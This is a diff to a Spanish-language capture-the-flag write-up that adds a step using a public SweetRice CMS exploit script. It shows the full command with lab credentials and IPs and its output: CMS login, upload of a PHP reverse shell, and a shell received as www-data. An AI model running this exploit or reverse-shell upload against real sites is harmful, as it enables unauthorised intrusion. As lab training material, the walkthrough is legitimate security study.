@@ -321,7 +321,29 @@ www-data
 $
 ```
 
-Hacemos un [Tratamiento de la tty](/posts/tratamiento-tty) para trabajar de manera más cómoda. En la ruta `/home/itguy` podemos encontrar la primera flag (user.txt). Ahora debemos buscar la forma de escalar privilegios:
+Hacemos un [Tratamiento de la tty](/posts/tratamiento-tty) para trabajar de manera más cómoda. Para facilitar la intrusión, se puede hacer uso del recurso [SweetRice-CMS-exploit](https://github.com/k4miyo/SweetRice-CMS-exploit).
+
+```bash
+❯ python3 sweetrice.py --url http://10.10.170.246/content --user manager --passwd Password123 --lhost 10.9.85.95
+[+] Login CMS SweetRice: Login successful
+[+] Shell: Established connection!
+[+] Trying to bind to :: on port 443: Done
+[+] Waiting for connections on :::443: Got connection from ::ffff:10.10.170.246 on port 59212
+[+] Reading file: File php-reverse-shell.php5 exists!
+[+] File: File uploaded
+[+] Reverse Shell: Correct reverse shell
+[*] Switching to interactive mode
+Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
+ 04:57:01 up  1:57,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ $ whoami
+www-data
+$
+```
+
+En la ruta `/home/itguy` podemos encontrar la primera flag (user.txt). Ahora debemos buscar la forma de escalar privilegios:
 
 ```bash
 www-data@THM-Chal:/home/itguy$ id 
